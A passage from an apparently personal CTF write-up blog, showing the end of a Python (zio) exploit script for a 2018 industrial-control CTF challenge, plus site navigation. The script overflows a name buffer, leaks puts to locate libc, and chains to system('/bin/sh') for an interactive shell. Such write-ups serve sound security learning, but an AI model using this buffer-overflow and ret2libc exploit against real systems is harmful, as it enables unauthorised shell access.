io1.writeline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#For win</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        attack(io1)</span><br><span class="line">    io2 = zio(target,timeout=<span class="number">2</span>,print_read=r_m2,print_write=w_m2)</span><br><span class="line">    login(io2,<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        runaway(io2)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        attack(io1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        attack(io1)</span><br><span class="line">        temp = io1.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;win&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">            runaway(io2)</span><br><span class="line">    io2.close()</span><br><span class="line">    </span><br><span class="line">    payload = <span class="number">0x4c</span>*<span class="string">&#x27;A&#x27;</span></span><br><span class="line">    payload += l32(<span class="number">0x08048670</span>)+l32(<span class="number">0x8048EC7</span>)+l32(<span class="number">0x804B02C</span>)</span><br><span class="line">    io1.read_until(<span class="string">&#x27;s your name:&#x27;</span>)</span><br><span class="line">    io1.writeline(payload)</span><br><span class="line"></span><br><span class="line">    io1.read_until(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">    puts_addr = l32(io1.read(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr)</span><br><span class="line">    libc_base = puts_addr-<span class="number">0x5fca0</span></span><br><span class="line">    system_addr = libc_base+<span class="number">0x3ada0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line">    binsh_addr = libc_base+<span class="number">0x15ba0b</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x4c</span>*<span class="string">&#x27;A&#x27;</span>+l32(system_addr)+l32(<span class="number">0xdeadbeef</span>)+l32(binsh_addr)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;binsh_addr:&#x27;</span>+<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">    io1.read_until(<span class="string">&#x27;s your name:&#x27;</span>)</span><br><span class="line">    <span class="comment">#io1.gdb_hint()</span></span><br><span class="line">    io1.writeline(payload)</span><br><span class="line">    </span><br><span class="line">    io1.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/10/17/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/" data-id="cuidBCYnS4Y1AKwgYfzGG_rv6" data-title="2018 赛博杯工控CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re。</a>
          </li>
        
          <li>
            <a href="/2025/11/01/qwb2025-re/">qwb2025-re。</a>
          </li>
        
          <li>
            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
          </li>
        
          <li>
            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
          </li>
        
          <li>
            <a href="/2025/10/09/2025crewctf/">crewCTF2025</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>